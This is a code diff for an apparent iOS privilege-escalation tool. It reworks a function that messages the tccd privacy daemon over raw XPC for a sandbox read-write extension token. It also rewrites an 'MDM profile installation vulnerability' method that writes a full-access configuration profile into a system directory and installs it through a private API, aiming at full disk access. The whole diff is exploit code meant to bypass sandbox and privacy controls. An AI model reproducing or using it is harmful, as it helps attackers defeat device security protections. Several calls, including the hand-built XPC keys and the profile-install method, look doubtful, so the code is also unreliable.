@@ -182,28 +182,41 @@ static bool patchfind(void* executable_map, size_t executable_length,
 
 // MARK: - tccd patching
 
+@interface LSApplicationWorkspace : NSObject
++ (id)defaultWorkspace;
+- (BOOL)installProfileWithPath:(NSString *)path;
+@end
+
 static void call_tccd(void (^completion)(NSString* _Nullable extension_token)) {
+    static xpc_connection_t connection;
     static dispatch_once_t onceToken;
-    static NSXPCConnection *sharedConnection;
     
     dispatch_once(&onceToken, ^{
-        sharedConnection = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.tccd"];
-        sharedConnection.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(TCCAccessProtocol)];
-        [sharedConnection resume];
+        connection = xpc_connection_create_mach_service("com.apple.tccd", NULL, 0);
+        xpc_connection_set_event_handler(connection, ^(xpc_object_t event) {
+            // Handle connection events if needed
+        });
+        xpc_connection_resume(connection);
     });
     
-    id<TCCAccessProtocol> remoteObject = [sharedConnection remoteObjectProxyWithErrorHandler:^(NSError *error) {
-        NSLog(@"XPC connection error: %@", error);
-        completion(nil);
-    }];
+    xpc_object_t message = xpc_dictionary_create(NULL, NULL, 0);
+    xpc_dictionary_set_string(message, "service", "com.apple.app-sandbox.read-write");
+    xpc_dictionary_set_bool(message, "require_purpose", false);
+    xpc_dictionary_set_bool(message, "preflight", false);
+    xpc_dictionary_set_bool(message, "background_session", false);
     
-    [remoteObject requestAccessForService:@"com.apple.app-sandbox.read-write"
-                            withPurpose:NO
-                             preflight:NO
-                     backgroundSession:NO
-                           completion:^(NSString *extension_token) {
+    xpc_connection_send_message_with_reply(connection, message, dispatch_get_main_queue(), ^(xpc_object_t reply) {
+        NSString *extension_token = nil;
+        if (reply && xpc_get_type(reply) == XPC_TYPE_DICTIONARY) {
+            const char *token = xpc_dictionary_get_string(reply, "extension_token");
+            if (token) {
+                extension_token = @(token);
+            }
+        }
         completion(extension_token);
-    }];
+    });
+    
+    xpc_release(message);
 }
 
 static NSData* patchTCCD(void* executableMap, size_t executableLength) {
@@ -366,15 +379,7 @@ static void grant_full_disk_access_ios16(void (^completion)(NSError* _Nullable))
 
 // Alternative method using MDM profile installation vulnerability
 static bool install_mdm_profile(void) {
-    const char* profile_path = "/private/var/mobile/Library/ConfigurationProfiles";
-    int fd = open(profile_path, O_RDONLY | O_CLOEXEC);
-    if (fd == -1) {
-        mkdir(profile_path, 0755);
-        fd = open(profile_path, O_RDONLY | O_CLOEXEC);
-        if (fd == -1) return false;
-    }
-    
-    // Create MDM profile with full disk access
+    NSString *profilePath = @"/private/var/mobile/Library/ConfigurationProfiles/fullaccess.mobileconfig";
     NSString *profileContent = @"<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
     "<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">"
     "<plist version=\"1.0\">"
@@ -407,18 +412,13 @@ static bool install_mdm_profile(void) {
     "</dict>"
     "</plist>";
     
-    NSString *profilePath = [NSString stringWithFormat:@"%s/fullaccess.mobileconfig", profile_path];
     NSError *error = nil;
     if (![profileContent writeToFile:profilePath atomically:YES encoding:NSUTF8StringEncoding error:&error]) {
-        close(fd);
         return false;
     }
     
-    // Trigger profile installation via private API
-    Class LSApplicationWorkspace = NSClassFromString(@"LSApplicationWorkspace");
-    id workspace = [LSApplicationWorkspace performSelector:@selector(defaultWorkspace)];
-    
-    return [workspace performSelector:@selector(installProfileWithPath:) withObject:profilePath];
+    LSApplicationWorkspace *workspace = [LSApplicationWorkspace defaultWorkspace];
+    return [workspace installProfileWithPath:profilePath];
 }
 
 void grant_full_disk_access(void (^completion)(NSError* _Nullable)) {
